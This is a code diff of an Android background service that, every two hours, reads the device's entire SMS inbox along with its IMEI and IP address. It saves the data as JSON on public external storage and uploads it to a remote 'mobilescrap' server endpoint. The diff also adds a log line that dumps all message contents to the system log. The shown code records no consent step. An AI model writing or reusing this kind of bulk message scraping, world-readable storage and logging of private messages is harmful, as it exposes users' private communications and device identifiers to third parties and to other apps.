@@ -60,6 +60,7 @@ public class MyServiceReadSms extends Service {
     public  String smsTimeStamp;
     public static Date lDateSMS;
     public  static SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+    public static File f;
 
     @Nullable
     @Override
@@ -70,18 +71,13 @@ public class MyServiceReadSms extends Service {
     @Override
     public void onCreate()
     {
-        Log.e(MainApplication.TAG, "Service onCreate");
+        Log.e(TAG, " ******************MyService READ SMS*******************");
         context = this;
-        Log.e(MainApplication.TAG, "Alarm received!: ");
-        Log.e(TAG, "MyService CALL LOG  : 11111111111111111111111111" );
         /** getting data from shared preference **/
         SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
-//        userLoggedinID = sharedPreferences.getString("logged_id", "null");
         userMobileNo = sharedPreferences.getString("mobile_no", "null");
-//        userID = sharedPreferences.getString("logged_id", "null");
 
         smsTimeStamp = sharedPreferences.getString("smsTimeStamp", "null");
-        Log.e(TAG, "onCreate: "+smsTimeStamp );
         try {
 
             lDateSMS= simpleDateFormat.parse(smsTimeStamp);
@@ -92,7 +88,6 @@ public class MyServiceReadSms extends Service {
             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             imeiNo = telephonyManager.getDeviceId();
             ipaddress = Utils.getIPAddress(true);
-            Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress );
         }catch (Exception e){
             e.printStackTrace();
         }
@@ -104,7 +99,7 @@ public class MyServiceReadSms extends Service {
         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
         Calendar calendar = Calendar.getInstance();
         int interval = 2 * 60 * 60 * 1000;
-//            int interval = 2 * 1000;
+//        int interval = 2 * 60 * 1000;
         alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), interval, pendingIntent);
 
 
@@ -116,7 +111,6 @@ public class MyServiceReadSms extends Service {
      * Read SMS
      **/
     public static void readSms(Context context, String userNo, String studentID) {
-        Log.e(MainApplication.TAG, " readSms:" );
         Context c = context;
         SmsPojo objSms;
         String message = "";
@@ -128,34 +122,31 @@ public class MyServiceReadSms extends Service {
             Uri uri = Uri.parse(SMS_URI_INBOX);
             // data which we need to show
             String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
-//            Cursor cur = getContentResolver().query(uri, projection, null, null, null);
-//            Cursor cur = getContentResolver().query(uri,projection, "address = '+919967391077'",null,null);
             Cursor cur = context.getContentResolver().query(uri, projection, null, null, null);
             //count the number of result we get
             int total = cur.getCount();
 //            Log.e("MediaContent", "ReadSms :query" + cur.toString() + "\n" + total);
             JSONArray json = new JSONArray();
             int d = 0;
-            // showProressBar("Reading sms. Please wait...");
+
+            /** getting data from shared preference **/
+            SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
+            userMobileNo = sharedPreferences.getString("mobile_no", "null");
+            String callTimeStamps = sharedPreferences.getString("callTimeStamp", "null");
+            try {
+                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                lDateSMS = simpleDateFormat.parse(callTimeStamps);
+//                Log.e(TAG, "lDateCall::::: "+ lDateSMS);
+            } catch (ParseException e) {
+                e.printStackTrace();
+            }
+
             if (cur.moveToFirst()) {
                 for (int i = 0; i < total; i++) {
                     double final1 = ((double) i / total) * 100;
-//                    Log.e(MainApplication.TAG, "readSms:progress "+final1+i);
                     int rounded = (int) Math.round(final1);
-//                    if(rounded==99){
-//                        rounded=100;
-//                        mDialog.setProgress(rounded);
-//                    }else {
-//                        mDialog.setProgress(rounded);
-//                    }
 
-//                    Log.e("Readsms", "readSms: "+total );
                     objSms = new SmsPojo();
-//                    String contactId = cur.getString(cur.getColumnIndex(
-//                            ContactsContract.Contacts._ID));
-//                    String hasPhone = cur.getString(cur.getColumnIndex(
-//                            ContactsContract.Contacts.HAS_PHONE_NUMBER));
-//                    Log.e(TAG, "readSms: "+contactId+"\n"+hasPhone );
 
                     String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                     String peron = cur.getString(cur.getColumnIndexOrThrow("person"));
@@ -164,20 +155,13 @@ public class MyServiceReadSms extends Service {
                     objSms.set_time(cur.getString(cur.getColumnIndexOrThrow("date")));
                     String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                     String type = cur.getString(cur.getColumnIndexOrThrow("type"));
-//                    Log.e("Readsms", "" + objSms.get_address() + "\n" + objSms.get_msg()+
-//                            "\n person"+peron+"\n type"+type+"\n ID"+id+"\n Date"+date);
                     cur.moveToNext();
-                    Log.e(TAG, "readSms: "+date);
                     try {
-//                        Date smsDate=simpleDateFormat.parse(date);
                         long dateOfSms=Long.valueOf(date);
-//                        Log.e(TAG, "readSms: "+dateOfSms);
                     if(lDateSMS != null)
                     {
                         if(lDateSMS.getTime() < dateOfSms)
                         {
-                            Log.e(TAG, "callLogs: lDateCall Notnull " + lDateSMS.getTime());
-                            Log.e(TAG, "callLogs: callDayTime " + dateOfSms);
                             JSONObject mObject = new JSONObject();
                             mObject.accumulate("from", objSms.get_address());
                             mObject.accumulate("message", objSms.get_msg());
@@ -187,7 +171,6 @@ public class MyServiceReadSms extends Service {
                             json.put(mObject);
                         }
                     }else {
-                        Log.e(TAG, "callLogs: Date is null callDayTime is " + objSms.get_time());
                         JSONObject mObject = new JSONObject();
                         mObject.accumulate("from", objSms.get_address());
                         mObject.accumulate("message", objSms.get_msg());
@@ -200,32 +183,23 @@ public class MyServiceReadSms extends Service {
                         e.printStackTrace();
                     }
                 }
-//                outerOb.accumulate("student_id", studentID);
-//                outerOb.accumulate("student_mobile_no", userNo);
                 outerOb.accumulate("created_by_ip", ipaddress);
-//                outerOb.accumulate("sim_serial_no", simImei);
                 outerOb.accumulate("sim_serial_no", imeiNo);
                 outerOb.accumulate("imei", imeiNo);
-//                outerOb.accumulate("mobileNo", userMobileNo);
                 outerOb.put("Sms_info", json);
                 message = outerOb.toString();
-                Log.e("Message ", "message: "+message );
-                Log.e("Message ", "outerOb: "+outerOb );
 
             }
             if(json.length()>2)
             {
                 mCreateAndSaveFile("saveSMS.json", message);
-            }else {
-                Log.e(TAG, "readSms: UPDATED ALREADY NO DATA IN JSON " );
             }
 
-
+            Log.e(TAG, "/*/*/*/*/*/*/*/*/*/*/*/*/SMS MESSAGES:/*/*/*/*/**/*/*/*/*/*/*/* "+ "\n" + message );
 
         } catch (SQLiteException ex)
 
         {
-            Log.d("SQLiteException", ex.getMessage());
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -233,14 +207,13 @@ public class MyServiceReadSms extends Service {
     /** END of Read SMS **/
 
     public static void mCreateAndSaveFile(String params, String mJsonResponse) {
-        Log.e(MainApplication.TAG, " mCreateAndSaveFile:" );
         try {
             String path = "/storage/sdcard0/" + params;
             final File dir = new File(Environment.getExternalStorageDirectory() + "/");
-            if (dir.exists() == false) {
+            if (!dir.exists()) {
                 dir.mkdirs();
             }
-            File f = new File(dir, params);
+            f = new File(dir, params);
             f.getAbsolutePath();
             FileWriter file = new FileWriter(f.getAbsolutePath());
             file.write(mJsonResponse);
@@ -255,26 +228,22 @@ public class MyServiceReadSms extends Service {
 
 
     public static void mReadJsonData(final String filename) {
-        Log.e(TAG, "mReadJsonData: " );
         final File dir = new File(Environment.getExternalStorageDirectory()+"/");
-        if (dir.exists() == false) {
+        if (!dir.exists()) {
             dir.mkdirs();
         }
         final File f = new File(dir, filename);
         new Thread(new Runnable() {
             @Override
             public void run() {
-                uploadFile(f.getAbsolutePath(), filename);
+                Log.e(TAG, "run: getAbsolutePath:::SMS::: "+ f.getAbsolutePath());
+//                uploadFile(f.getAbsolutePath(), filename);
             }
         }).start();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
-        Log.e(MainApplication.TAG, "Service onStartCommand");
-        Log.e(TAG, "selectOperations: " );
-
         longOperation = new LongOperation();
         longOperation.execute("sms");
         //start sticky means service will be explicity started and stopped
@@ -292,7 +261,6 @@ public class MyServiceReadSms extends Service {
         @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
         @Override
         protected Void doInBackground(String... params) {
-            Log.e(TAG, "doInBackground: "+params[0] );
             readSms(context, userMobileNo, userID);
             return null;
         }
@@ -308,17 +276,12 @@ public class MyServiceReadSms extends Service {
     /** upload SMS file to server **/
     public static int uploadFile(final String selectedFilePath, String fileType) {
         String a=fileType;
-//        String[]  scrapingfileName = a.split(".");
        a= a.substring(0, a.lastIndexOf('.'));
 
         StringBuffer sb;
         long total = 0;
-//        String urlup = "http://139.59.32.234/sms/Api/send_message";
-        String urlup = "http://139.59.32.234/eduvanzApi/mobilescrap/send_message";
+        String urlup = MainApplication.mainUrl + "mobilescrap/send_message";
         int serverResponseCode = 0;
-
-        Log.e(TAG, "uploadFile: 999999999999999999999999999999" );
-        Log.e(TAG, "uploadFile:"+"  file name : "+ a );
 
         HttpURLConnection connection;
         DataOutputStream dataOutputStream;
@@ -326,7 +289,7 @@ public class MyServiceReadSms extends Service {
         String twoHyphens = "--";
         String boundary = "*****";
 
-        final int count,fileLength;
+        final int fileLength;
 
         int bytesRead, bytesAvailable, bufferSize;
         byte[] buffer;
@@ -338,26 +301,11 @@ public class MyServiceReadSms extends Service {
         final String fileName = parts[parts.length - 1];
 
         if (!selectedFile.isFile()) {
-            //dialog.dismiss();
-
-//            runOnUiThread(new Runnable() {
-//                @Override
-//                public void run() {
             Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
-//                }
-//            });
             return 0;
         }
         else {
             try {
-//                runOnUiThread(new Runnable() {
-//                    @Override
-//                    public void run() {
-//                        showProressBar("Please wait verifying user credentials");
-//                    }
-//
-//                });
-
 
                 FileInputStream fileInputStream = new FileInputStream(selectedFile);
                 URL url = new URL(urlup);
@@ -457,15 +405,13 @@ public class MyServiceReadSms extends Service {
 
                 //response code of 200 indicates the server status OK
                 if (serverResponseCode == 200) {
-//                    runOnUiThread(new Runnable() {
-//                        @Override
-//                        public void run() {
-//                            Toast.makeText(context, sb.toString(), Toast.LENGTH_SHORT).show();
-                    Log.e(TAG, "uploadFile: SMS"+sb.toString() );
+                    Log.e(TAG, "uploadFile: *********MY SERVICE READ SMS********** " + "\n" +sb.toString() );
 
                     Log.e("ReadSms", " here: SMS \n\n" + fileName);
-//                        }
-//                    });
+
+//                    if(f.exists()){
+//                        f.delete();
+//                    }
                 }
 
                 //closing the input and output streams
@@ -476,24 +422,15 @@ public class MyServiceReadSms extends Service {
 
             } catch (FileNotFoundException e) {
                 e.printStackTrace();
-//                runOnUiThread(new Runnable() {
-//                    @Override
-//                    public void run() {
-//                        Toast.makeText(context, "File Not Found", Toast.LENGTH_SHORT).show();
                 Log.e(TAG, "uploadFile: "+"File Not Found" );
-//                    }
-//                });
             } catch (MalformedURLException e) {
                 e.printStackTrace();
-//                Toast.makeText(context, "URL error!", Toast.LENGTH_SHORT).show();
                 Log.e(TAG, "uploadFile: "+"URL error!" );
 
             } catch (IOException e) {
                 e.printStackTrace();
-//                Toast.makeText(context, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
                 Log.e(TAG, "uploadFile: "+"Cannot Read/Write File!" );
             }
-//            dialog.dismiss();
             return serverResponseCode;
         }
     }
